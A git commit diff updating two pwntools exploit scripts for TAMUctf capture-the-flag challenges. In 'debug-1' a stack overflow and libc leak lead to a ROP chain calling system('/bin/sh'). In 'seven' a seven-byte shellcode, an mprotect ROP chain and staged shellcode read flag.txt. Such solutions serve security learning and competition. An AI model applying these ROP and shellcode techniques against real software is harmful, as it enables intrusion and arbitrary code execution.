f6bc07e71efaeb10ff0430c6de11ac7278e5669d
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-07-18 10:49:35 +0800

    Update TAMUctf

--- TAMUctf/debug-1/debug-1.py
+++ TAMUctf/debug-1/debug-1.py
@@ -1,7 +1,7 @@
 from pwn import *
 
-context.log_level = 'debug'
 context.arch = 'amd64'
+context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
 p = gdb.debug('./debug-1_patched', '''
@@ -11,43 +11,34 @@ p = gdb.debug('./debug-1_patched', '''
 
 # p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")
 
-def modify_payload(payload):
+def reverse_modify(payload):
     result = b''
     for byte in payload:
-        # Check if uppercase letter (65-90 in ASCII)
         if 65 <= byte <= 90:
-            # Convert to lowercase by adding 32
             result += bytes([byte + 32])
-        # Check if lowercase letter (97-122 in ASCII)
         elif 97 <= byte <= 122:
-            # Convert to uppercase by subtracting 32
             result += bytes([byte - 32])
         else:
-            # Keep other characters unchanged
             result += bytes([byte])
     return result
 
-p.sendlineafter(b'3: Exit\n\n', b'1')
-p.recvuntil(b'Input a string (max length of 69 characters):\n\n')
-p.send(modify_payload(b'\0'*0x58+p64(0x4013a0)))
+# 1. stack overflow to overwrite return address
+p.sendlineafter(b"3: Exit\n\n", b'1')
+p.sendafter(b"Input a string (max length of 69 characters):\n\n", reverse_modify(b'\x00'*0x58+p64(0x4013a0)))
 
+# 2. ROP to pop a shell
 glibc_e = ELF('./libc.so.6')
-glibc_r = ROP('./libc.so.6')
-
-
-p.sendlineafter(b'3. Feature 3 (I hope your day is going well :) )\n', b'1')
-p.recvuntil(b'libc leak: ')
-glibc_base_addr = int(p.recvline().strip().decode(), 16)-glibc_e.symbols.system
-print(f'glibc base address: {hex(glibc_base_addr)}')
-
-p.recvuntil(b'Leave a message here (max: 80 characters)!\n')
+p.sendlineafter(b"3. Feature 3 (I hope your day is going well :) )\n", b'1')
+p.recvuntil(b"libc leak: ")
+glibc_base_addr = int(p.recvline().strip().decode(), 16)-glibc_e.sym.system
+log.info(f"glibc base address: {hex(glibc_base_addr)}")
 chain = [
-    glibc_r.rdi.address + glibc_base_addr,
-    next(glibc_e.search(b"/bin/sh")) + glibc_base_addr,
-    glibc_r.ret.address + glibc_base_addr,
-    glibc_e.symbols.system + glibc_base_addr
+    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
+    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
+    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
+    glibc_base_addr+glibc_e.sym.system
 ]
-p.send(b'\0'*0x68+b''.join([p64(c) for c in chain]))
+p.sendafter(b"Leave a message here (max: 80 characters)!\n", b'\0'*0x68+b''.join([p64(c) for c in chain]))
 
 p.interactive()
 
--- TAMUctf/seven/seven.py
+++ TAMUctf/seven/seven.py
@@ -1,7 +1,7 @@
 from pwn import *
 
-context.log_level = 'debug'
 context.arch = 'amd64'
+context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
 p = gdb.debug('./seven_patched', '''
@@ -11,83 +11,67 @@ p = gdb.debug('./seven_patched', '''
 
 # p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")
 
-# Trigger read(0, rsp, 0x500000) to read ROP chain into $rsp on the stack
-seven_bytes_shellcode = asm('''
+# execve syscall and execveat syscall are forbidden
+# only a seven-byte shellcode is allowed to inject
+# after reading in a seven-byte shellcode, 0x500000-0x501000 region is set to be readable and executable, but not writable
+
+# 1. use a seven-byte shellcode to trigger read(0, $rsp, 0x500000) to read a ROP chain to stack starting from $rsp
+seven_byte_shellcode = asm('''
+    /* read(0, $rsp, 0x500000) */
+    /* rax=0 and rdx=0x500000 is already set in context */
     xor edi, edi
     push rsp
     pop rsi
     syscall
     ret
 ''')
-p.send(seven_bytes_shellcode)
+p.send(seven_byte_shellcode)
 
-# Find critical gadgets
-POP_7_REGISTERS = 0x401362
-MPROTECT = 0x403fe8
-CALL_R12_ADD_RBX_MUL_8 = 0x401348
-ADD_EBX_TO_DWORD_PTR_RBP_MINUS_3D = 0x401218
-
-# Trigger mprotect(0x500000, 0x1000, 7) to make the 0x500000-0x501000 region executable
-rop_payload = b''
-rop_payload += p64(POP_7_REGISTERS) # pop 7 registers
-rop_payload += p64(0) # rbx
-rop_payload += p64(1) # rbp
-rop_payload += p64(MPROTECT) # r12
-rop_payload += p64(0x500000) # r13, edi later
-rop_payload += p64(0x1000) # r14, rsi later
-rop_payload += p64(0x7) # r15, rdx later
-rop_payload += p64(CALL_R12_ADD_RBX_MUL_8) # call [r12+rbx*8]
-rop_payload += p64(0xAAAAAAAA) # necessary trash due to add rsp, 0x8
-
-# Read flag.txt and print it: push filename "flag.txt" to stack; call open("flag.txt", 0, 0); call read(fd, 0x500320, 128); call write(1, 0x500320, 128); call exit(0)
-longer_shellcode = asm('''
+# 2. use three special gadgets to ROP for long shellcode injection
+GADGET_1 = 0x401362  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+GADGET_2 = 0x401348  # mov rdx, r15; mov rsi, r14; mov edi, r13; call qword ptr [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 0x401348; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+GADGET_3 = 0x401218  # add dword ptr [rbp - 0x3d], ebx; nop dword ptr [rax + rax]; ret;
+MPROTECT_GOT = 0x403fe8
+shellcode = asm('''
+    /* push filename 'flag.txt\x00' to stack */
     mov rsi, 0
     push rsi
     mov rsi, 0x7478742e67616c66
     push rsi
-
+    /* open("flag.txt", 0, 0) */
     mov rax, 2
     mov rdi, rsp
     mov rsi, 0
     mov rdx, 0
     syscall
-
+    /* read(fd, 0x500500, 128) */
     mov rdi, rax
     mov rax, 0
-    mov rsi, 0x500320
+    mov rsi, 0x500500
     mov rdx, 128
     syscall
-
+    /* write(1, 0x500500, 128) */
     mov rax, 1
     mov rdi, 1
-    mov rsi, 0x500320
+    mov rsi, 0x500500
     mov rdx, 128
     syscall
-
-    mov rax, 60
-    mov rdi, 0
-    syscall
-''')
-longer_shellcode_payload = b''
-pos = 0
-while pos < len(longer_shellcode):
-    part = longer_shellcode[pos:pos + 4]
-    if pos != 0:
-        longer_shellcode_payload += p64(POP_7_REGISTERS) # pop 7 registers
-    longer_shellcode_payload += part.ljust(8, b'\x00') # rbx
-    longer_shellcode_payload += p64(0x500007+pos+0x3d) # rbp
-    longer_shellcode_payload += p64(0x0) # r12
-    longer_shellcode_payload += p64(0x0) # r13, edi later
-    longer_shellcode_payload += p64(0x0) # r14, rsi later
-    longer_shellcode_payload += p64(0x0) # r15, rdx later
-    longer_shellcode_payload += p64(ADD_EBX_TO_DWORD_PTR_RBP_MINUS_3D)  # add ebx to dword ptr [rbp - 0x3d]
-    pos += 4
-rop_payload += longer_shellcode_payload
-
-# Jump to execute the longershellcode
-rop_payload += p64(0x500007)
-
-p.sendline(rop_payload)
+''')  # shellcode to trigger open&read&write to retrieve flag
+payload = b''
+# trigger mprotect(0x500000, 0x1000, 7) to make 0x500000-0x501000 region writable
+payload += p64(GADGET_1)+p64(0)+p64(1)+p64(MPROTECT_GOT)+p64(0x500000)+p64(0x1000)+p64(0x7)+p64(GADGET_2)+p64(0)  # ensure "add rbx, 0x1; cmp rbp, rbx; add rsp, 0x8;" in GADGET_2
+# write shellcode to writable region starting from 0x500007 four bytes at a time
+position = 0
+while position < len(shellcode):
+    four_bytes = shellcode[position:position + 4]
+    if position != 0:
+        payload += p64(GADGET_1)+four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
+    else:
+        payload += four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
+    position += 4
+# jump to starting address 0x500007 to execute shellcode just written
+payload += p64(0x500007)
+p.send(payload)
 
 p.interactive()
 
